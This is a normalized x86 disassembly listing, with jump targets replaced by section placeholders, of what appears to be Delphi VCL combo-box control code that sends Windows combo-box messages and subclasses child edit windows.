jne r-xdata
sub_434934
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_443aac
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_4446f8
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_4343f8
sub_434970
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4449fc
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_403468
push 0xfffffff0
mov eax esi
call sub_4446f8
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_4349a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_4457f8
pop esi
pop ebx
retn
sub_4349e0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434a46
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_4446f8
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434a4d
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_4145ac
sub_434a58
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_4446f8
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_434a7c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_4446f8
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_404608
mov edx esi
xchg edx eax
call sub_404608
mov eax [ esi ]
call sub_40447c
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_4446f8
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_434ad4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_434b38
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_43dec4
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_4446f8
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_43def4
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434b3f
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_434b44
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_4446f8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_434b64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40447c
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_4446f8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_434b8c
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_4446f8
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_43e400
sub_434bc0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_434c33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40447c
push eax
push 0x0
push 0x143
mov eax [ ebx + 0x10 ]
call sub_4446f8
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434c3a
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
sub_434c44
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_434cb7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_40447c
push eax
push esi
push 0x14a
mov eax [ ebx + 0x10 ]
call sub_4446f8
push eax
call SendMessageA
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434cbe
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
sub_434cc4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_440424
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_43d680
mov edx 0x19
mov eax ebx
call sub_43d6a4
mov dl 0x1
mov eax ebx
call sub_44492c
xor edx edx
mov eax ebx
call sub_43e088
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cfb0
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43caa0
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_435068
call sub_41a410
mov [ ebx + 0x24c ] eax
push ebx
push sub_435160
call sub_41a410
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_434db8
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax esi
call sub_4449fc
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_4559b8
mov eax [ esi + 0x24c ]
call sub_4559b8
mov eax [ esi + 0x208 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_440548
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_434e3a
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_441aec
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_434e84
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_434ea8
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_4446f8
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_4446f8
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_434ef0
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_434f1c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
sub_434f58
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
cmp esi [ ebx + 0x20c ]
je r-xdata
xor esi esi
pop esi
pop ebx
retn
mov [ ebx + 0x20c ] esi
mov eax ebx
call sub_4449fc
test al al
je r-xdata
push 0x0
push esi
push 0x141
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
sub_434fa8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_4446f8
push eax
call SetWindowTextA
sub_434fe4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_434e84
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_43501c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_443d10
pop esi
pop ebx
retn
mov eax ebx
call sub_441c98
sub_435040
push ebx
mov ebx eax
mov eax ebx
call sub_43fae8
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_435068
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_455b0c
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_43da08
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406994
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_43e584
jmp r-xdata
sub_435194
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43544b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44354c
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_443634
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434e84
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45f3b0
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403468
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_455b0c
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4333bc
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4436fc
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_434e84
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_434ea8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_435470
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_43e680
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_44210c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4436fc
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41c1d4
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_41ce58
call sub_41c1d4
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_41ce94
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_442078
test al al
jne r-xdata
mov eax ebx
call sub_434e84
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_434ea8
jmp r-xdata
sub_43557e
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_4356dc
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4356e3
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
jmp [ eax * 4 + jump_table_4355ac ]
mov eax edi
mov si 0xffe9
call sub_403468
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_403468
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_403468
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43def4
mov eax edi
mov si 0xffeb
call sub_403468
mov eax edi
mov si 0xffb2
call sub_403468
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_403468
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_442e7c
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_442f68
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_4446f8
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_4446f8
push eax
call PostMessageA
jmp r-xdata
sub_435710
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4357b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
call sub_43cab8
cmp [ ebx + 0x282 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_41d204
test esi esi
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4357c0
lea eax [ ebp - 0x14 ]
call sub_403fbc
retn
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebx + 0x23c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x208 ]
call sub_41d3b8
sub_4357ec
push esi
push edi
mov esi eax
mov eax esi
call sub_43ffcc
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_435814
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4449fc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_435868
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_403468
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_435894
push ebx
mov ebx eax
mov eax ebx
call sub_4416b0
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_4358d5
inc ebp
cld
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_435962
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435969
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_435969
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_435988
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_4359b8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_435a37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435a3e
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_435a44
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_435a84
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40446c
xor eax eax
push ebp
push sub_435acd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435ad4
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_435adc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_434cc4
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov dl 0x1
call sub_40323c
mov esi eax
mov [ ebx + 0x23c ] esi
mov [ esi + 0x10 ] ebx
mov [ ebx + 0x238 ] 0x10
mov [ ebx + 0x276 ] 0x0
xor eax eax
mov [ ebx + 0x26c ] eax
mov [ ebx + 0x268 ] 0x1
mov [ ebx + 0x290 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_435b60
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_40326c
mov eax [ esi + 0x278 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_434db8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_435bb0
push ebx
mov ebx eax
cmp dl [ ebx + 0x276 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x276 ] dl
cmp dl 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_441c98
sub_435c14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441584
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_4414b0
mov eax [ esi + 0x4 ]
or eax 0x200240
xor edx edx
mov dl [ ebx + 0x276 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x275 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x274 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_435c75
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_435894
mov eax ebx
call sub_4446f8
mov [ ebx + 0x248 ] eax
mov esi [ ebx + 0x278 ]
test esi esi
je r-xdata
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x278 ]
call sub_40326c
xor eax eax
mov [ ebx + 0x278 ] eax
cmp [ ebx + 0x260 ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
mov eax ebx
call sub_4446f8
push eax
call GetWindow
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x260 ]
jge r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
push 0x0
mov eax [ ebx + 0x260 ]
push eax
push 0x14e
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x260 ] eax
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
mov edi esi
mov [ ebx + 0x240 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x250 ] eax
mov eax [ ebx + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x240 ]
push eax
call SetWindowLongA
mov edi esi
mov [ ebx + 0x244 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x258 ] eax
mov eax [ ebx + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push esi
call GetWindow
mov esi eax
sub_435db8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_441a94
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x260 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov esi eax
